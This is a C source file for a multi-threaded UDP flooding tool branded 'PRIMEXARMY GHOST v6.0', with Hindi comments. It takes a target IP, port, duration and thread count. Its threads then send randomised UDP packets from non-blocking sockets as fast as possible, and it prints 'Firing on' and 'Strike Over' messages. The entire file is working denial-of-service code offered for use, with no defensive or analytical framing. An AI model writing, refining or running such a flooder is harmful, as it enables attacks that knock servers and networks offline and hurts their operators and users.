#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>

/* ⚔️ PRIMEXARMY v6.0 - GHOST UDP (Non-Blocking) ⚔️ */

struct thread_data {
    char *ip;
    int port;
    int duration;
};

void *prime_strike(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    
    if ((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) return NULL;

    // ✨ FEATURE 1: NON-BLOCKING MODE (बिना रुके पैकेट फायर करना)
    fcntl(sock, F_SETFL, O_NONBLOCK);

    int tos = 0x10; 
    setsockopt(sock, IPPROTO_IP, IP_TOS, &tos, sizeof(tos));

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    char payload[1024];
    time_t start_time = time(NULL);
    time_t end_time = start_time + data->duration;
    
    // ✨ FEATURE 2: OPTIMIZED TIME CHECK (CPU पर लोड कम करने के लिए)
    unsigned long int packet_count = 0;

    while (1) {
        // हर 2000 पैकेट के बाद समय चेक करेगा, जिससे रफ़्तार बनी रहे
        if (packet_count % 2000 == 0) {
            if (time(NULL) >= end_time) break;
        }

        for (int i = 0; i < 64; i++) {
            payload[i] = (char)(rand() % 256);
        }

        int packet_size = 64 + (rand() % 448); 
        
        sendto(sock, payload, packet_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        packet_count++;
    }

    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("\n   ⚔️  𝗣𝗥𝗜𝗠𝗘𝗫𝗔𝗥𝗠𝗬 𝗚𝗛𝗢𝗦𝗧 𝘃𝟲.𝟬  ⚔️\n");
        printf("   ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n");
        printf("   Usage: ./PRIME <ip> <port> <time> <threads>\n\n");
        return 1;
    }

    struct thread_data data;
    data.ip = argv[1];
    data.port = atoi(argv[2]);
    data.duration = atoi(argv[3]);
    int threads = atoi(argv[4]);

    pthread_t thread_id[threads];
    srand(time(NULL));

    printf("🚀 [GHOST v6.0] Firing on %s:%d\n", data.ip, data.port);

    for (int i = 0; i < threads; i++) {
        pthread_create(&thread_id[i], NULL, prime_strike, &data);
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_id[i], NULL);
    }

    printf("✅ [FINISHED] Strike Over.\n");
    return 0;
}
